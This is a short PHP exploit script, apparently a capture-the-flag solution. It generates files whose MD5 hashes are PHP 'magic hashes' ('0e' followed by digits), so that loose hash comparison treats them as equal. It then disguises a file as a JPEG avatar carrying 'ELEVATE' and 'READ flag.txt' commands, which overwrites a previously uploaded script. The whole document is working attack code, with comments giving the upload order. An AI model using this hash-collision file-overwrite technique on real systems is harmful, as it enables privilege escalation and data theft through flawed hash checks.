<?php
function genfile($content) {
	$start = time();
	$max_i = 0;
	echo "Starting generation. . .\n";
	while(true) {
		$file = $content;
		for($len=1;$len<956;$len++) {
			$file .= chr(mt_rand(32,126));
			$hash = md5($file);
			if($hash{0} == '0' && $hash{1} == 'e') {
				for($i=2;$i<32;$i++) {
					if($hash{$i}>'9') break;
				}
				if($i >= 32) {
					echo '['.(time()-$start).'s]' . "Found with hash: $hash\n";
					return $file;
				} elseif($i > $max_i) {
					echo '['.(time()-$start).'s|'.$i.']' . $hash.PHP_EOL;
					$max_i = $i;

				}
			}
		}
	}
}

//Upload this as an avatar image to overwrite the created script.cmd
$imgfile = genfile("\xFF\xD8\xFF\xDB\n" . "ELEVATE\nREAD flag.txt\n#");
echo "Writting to script.cmd\n";
file_put_contents('script.cmd', $imgfile);

//Upload script.txt first as a script, the script.cmd file is an image that will overwrite this file
$normalfile = genfile("ECHO hi\n#");
echo "Writting to script.txt\n";
file_put_contents('script.txt', $normalfile);

?>